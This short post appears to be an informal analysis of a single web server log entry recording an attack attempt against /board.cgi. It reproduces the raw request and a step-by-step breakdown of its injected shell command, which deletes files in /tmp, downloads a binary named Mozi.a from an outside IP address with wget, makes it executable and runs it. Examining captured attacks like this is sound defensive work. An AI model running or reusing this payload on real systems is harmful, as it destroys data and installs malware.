## Here is a cyber-attack example

The content sent to the server tries to get it to install and run malicious software. All part of the territory...


```
"GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://182.59.105.211:56191/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 404 870
```

```
HTTP GET 
Paylod: /board.cgi? and tries to run:
      cmd = 
          cd /tmp
          rm -rf *
          wget http://182.59.105.211:56191/Mozi.a
          chmod 777 Mozi.a
          /tmp/Mozi.a varcron        (seems to imply /var/cron) 
 HTTP/1.0
 404 means not found; trailing '870' is ? timing ? 
 ```
